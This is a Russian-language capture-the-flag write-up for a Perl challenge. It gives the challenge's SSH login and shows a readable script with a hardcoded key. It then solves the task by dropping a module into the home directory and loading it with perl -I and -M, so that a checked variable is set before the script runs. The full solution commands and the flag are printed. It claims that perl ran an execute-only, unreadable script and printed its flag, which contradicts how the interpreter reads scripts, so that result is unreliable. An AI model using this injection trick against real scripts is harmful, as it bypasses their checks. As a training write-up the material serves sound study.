# Give Perls

## Overview

**Категория:** MISC
**Сложность:** Easy

В задаче даны два Perl-скрипта в `/opt/challenge`: `without_flag.pl` (читаемый) и `with_flag.pl` (execute-only — нельзя прочитать, но можно запустить). Скрипты ожидают, что в `$main::provided` будет задан корректный ключ; если он совпадает с ожидаемым — скрипт печатает флаг. У пользователя есть возможность положить модуль в свой `$HOME`.

---

## Анализ

### Разведка

Подключившись по SSH:

```
ssh ctf@give-perls.mctf.ru -p 2222
Пароль: ctf
```

В `/opt/challenge` видны два файла:

```
$ ls -l /opt/challenge
---x--x--x 1 root root 364 Oct 26 19:28 /opt/challenge/with_flag.pl
-r-xr-xr-x 1 root root 428 Oct 26 19:28 /opt/challenge/without_flag.pl
```

`without_flag.pl` читается и показывает логику:

```perl
# /opt/challenge/without_flag.pl (фрагмент)
my $required_key = 'omg_MTUCI_is_the_best';
my $provided = defined $main::provided ? $main::provided : "not_real_perl_key";

if ( $provided eq $required_key ) {
    say "Flag is **********************";
} else {
    say "No, here is another secret word";
    print "required_key: $required_key\n";
    print "provided: $provided\n";
    exit 1;
}
```

Из этого видно, что достаточно установить `$main::provided = 'omg_MTUCI_is_the_best'` до выполнения скрипта, и тогда будет напечатан флаг. `with_flag.pl` нельзя прочитать, но исполняется, поэтому она, вероятно, делает ту же проверку и напечатает сам флаг, если переменная задана.

### Идея эксплоита

Perl позволяет загружать модули перед выполнением основного скрипта (`-MModule`), а также добавлять директорию в `@INC` (`-I/path`). Если создать модуль `SetProvided` в домашней директории, в `BEGIN` которого задать `$main::provided`, и затем запустить интерпретатор с `-MSetProvided` и `-I$HOME`, то требуемая переменная будет установлена до выполнения скрипта — скрипт посчитает, что ключ совпадает, и напечатает флаг.

---

## Эксплуатация (команды и проверка)

1. Создаём модуль в домашней директории:

```sh
cat > ~/SetProvided.pm <<'EOF'
package SetProvided;
BEGIN { $main::provided = 'omg_MTUCI_is_the_best' }
1;
EOF
```

2. Для читаемого варианта (проверка, видно вывод):

```sh
export LC_ALL=C
perl -I"$HOME" -MSetProvided /opt/challenge/without_flag.pl
# Ожидаемый вывод:
# Flag is **********************
# Goodbye
```

3. Для execute-only файла (тот же приём работает):

```sh
perl -I"$HOME" -MSetProvided /opt/challenge/with_flag.pl
# Вывод:
# Flag is MCTF{p3rl_can_be_h4ck3d_l1ke_th1ssss}
# Goodbye
```

> В моём сеансе именно команда с `-I"$HOME" -MSetProvided` позволила получить флаг из `with_flag.pl`, несмотря на то, что файл нельзя было прочитать.

---

## Результат

**Флаг:** `MCTF{p3rl_can_be_h4ck3d_l1ke_th1ssss}`
![MCTF](../../img/MCTF-Give-Perls.png)